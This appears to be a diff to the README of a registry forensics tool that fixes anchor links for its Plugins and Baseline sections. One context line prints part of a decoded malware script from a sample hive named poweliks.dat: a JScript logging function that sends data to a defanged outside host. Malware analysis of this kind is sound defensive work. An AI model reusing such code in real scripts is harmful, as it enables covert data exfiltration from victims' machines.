@@ -13,8 +13,8 @@
     - [Query keys (Recursively)](#query-keys-r)
     - [Query values](#query-values)
     - [Registry Handlers](#registry-handlers)
-    - [Plugins](#plugins)
-    - [Baseline/Whitelist](#baseline)
+    - [Plugins](#plugins-main)
+    - [Baseline/Whitelist](#baseline-main)
     
 ## Introduction: <a name="introduction"></a>
 
@@ -324,7 +324,7 @@ cat /tmp/script.vbe | head -c 120
 function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
 </pre>
 
-### Plugins: <a name="plugins></a>:
+### Plugins: <a name="plugins-main></a>:
 
 <pre>
 -s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
@@ -336,7 +336,7 @@ Following command would execute all specified plugins against all loaded hives:
 </pre>
 
 
-### Baseline: <a name="baseline></a>:
+### Baseline: <a name="baseline-main></a>:
 
 It's still in beta version (a feature from regparser, with low attention rate, but i still think that it's usefull)
 
